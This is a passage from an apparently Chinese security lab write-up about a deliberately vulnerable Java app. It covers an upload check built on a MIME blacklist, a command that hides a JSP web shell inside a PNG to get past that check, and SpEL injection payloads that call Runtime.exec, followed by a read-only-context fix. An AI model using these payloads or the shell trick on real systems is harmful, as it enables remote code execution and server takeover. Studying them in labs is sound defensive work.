        // 判断MIME类型是否在黑名单内 校验2
        String[] mimeTypeBlackList = {
                "text/html",
                "text/javascript",
                "application/javascript",
                "application/ecmascript",
                "text/xml",
                "application/xml"
        };
        for (String blackMimeType : mimeTypeBlackList) {
            // 用contains是为了防止text/html;charset=UTF-8绕过
            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) {
                logger.error("[-] Mime type error: " + mimeType);
                deleteFile(filePath);
                return "Upload failed. Illeagl picture.";
            }
        }

        // 判断文件内容是否是图片 校验3
        boolean isImageFlag = isImage(excelFile);
        deleteFile(randomFilePath);

        if (!isImageFlag) {
            logger.error("[-] File is not Image");
            deleteFile(filePath);
            return "Upload failed. Illeagl picture.";
        }


        try {
            // Get the file and save it somewhere
            byte[] bytes = multifile.getBytes();
            Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());
            Files.write(path, bytes);
        } catch (IOException e) {
            logger.error(e.toString());
            deleteFile(filePath);
            return "Upload failed";
        }

        logger.info("[+] Safe file. Suffix: {}, MIME: {}", Suffix, mimeType);
        logger.info("[+] Successfully uploaded {}", filePath);
        return String.format("You successfully uploaded '%s'", filePath);
    }

```

判断为图片才允许上传，不过仍可通过其他方式绕过

```
copy 1.png/shell.jsp muma.png
```

### SpEL表达式注入漏洞

Spring表达式语言（简称 **SpEL**，全称**Spring Expression Language**）是一种功能强大的表达式语言，支持在运行时查询和操作对象图。它语法类似于OGNL，MVEL和JBoss EL，在方法调用和基本的字符串模板提供了极大地便利，也开发减轻了Java代码量。另外 , SpEL是Spring产品组合中表达评估的基础，但它并不直接与Spring绑定,可以独立使用。

spel语法中的`T()`操作符 , `T()`操作符会返回一个object , 它可以帮助我们获取某个类的静态方法 , 用法`T(全限定类名).方法名()`

#### 1./spel/vuln1

```
   @RequestMapping("/spel/vuln1")
    public String spel_vuln1(String value) {
        ExpressionParser parser = new SpelExpressionParser();
        return parser.parseExpression(value).getValue().toString();
    }

```

可以通过spel表达式实现命令执行

```
T(java.lang.Runtime).getRuntime().exec("calc")
```

#### 2./spel/vuln2

```
@RequestMapping("spel/vuln2")
    public String spel_vuln2(String value) {
        StandardEvaluationContext context = new StandardEvaluationContext();
        SpelExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(value, new TemplateParserContext());
        Object x = expression.getValue(context);    // trigger vulnerability point
        return x.toString();   // response
    }
```

比第一关多了一个模板引擎，用#{}套上就好了

```
 #{T(java.lang.Runtime).getRuntime().exec('calc')}

```

#### 漏洞修复

修复代码：

```
  @RequestMapping("spel/sec")
    public String spel_sec(String value) {
        SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
        SpelExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(value, new TemplateParserContext());
        Object x = expression.getValue(context);
        return x.toString();
    }

```

使用 SimpleEvaluationContext进行加固，定义一个只读的上下文环境防止不安全的操作
